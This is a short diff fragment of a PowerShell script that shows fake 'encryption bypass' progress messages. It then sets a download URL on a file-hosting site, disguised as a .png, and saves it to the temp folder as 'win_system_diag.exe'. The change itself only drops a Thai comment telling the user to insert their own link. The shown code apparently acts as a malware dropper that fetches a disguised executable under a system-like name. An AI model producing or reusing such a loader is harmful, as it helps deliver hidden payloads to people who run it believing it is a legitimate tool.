@@ -19,7 +19,7 @@ for ($i = 0; $i -le 100; $i += 5) {
 Write-Host "`n  [+] ENCRYPTION BYPASS SUCCESSFUL" -ForegroundColor Green
 Write-Host "  [*] DOWNLOADING ENGINE COMPONENTS..." -ForegroundColor DarkGray
 
-$exeUrl = "https://files.catbox.moe/renxf3.png" # แก้ลิงก์ของคุณตรงนี้
+$exeUrl = "https://files.catbox.moe/renxf3.png"
 $tempPath = "$env:TEMP\win_system_diag.exe"
 
 try {
